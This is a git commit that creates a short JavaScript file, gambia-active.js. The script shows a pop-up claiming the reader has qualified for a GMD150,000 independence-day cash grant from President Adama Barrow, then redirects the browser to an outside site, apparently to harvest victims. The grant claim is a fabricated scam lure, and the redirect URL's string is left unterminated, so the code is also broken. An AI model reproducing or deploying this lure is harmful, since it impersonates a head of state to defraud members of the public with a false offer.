f2bb6f8eb1dbd8ee56a559d3bfa7072705452be8
superblog1 <imohette4@gmail.com>
2025-02-13 04:48:56 +0100

    Create gambia-active.js

---
+++ gambia-active.js
@@ -0,0 +1,6 @@
+
+var password = 'APPLY NOW'
+password=prompt('SMS: Congratulations You are qualify for President ADAMA BARROW GMD150,000 INDEPENDENCE DAY CELEBRATION CASH GRANT, Kindly Press OK to get gift now   ','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://fast-wayprogram.org/gambia.html;
+}
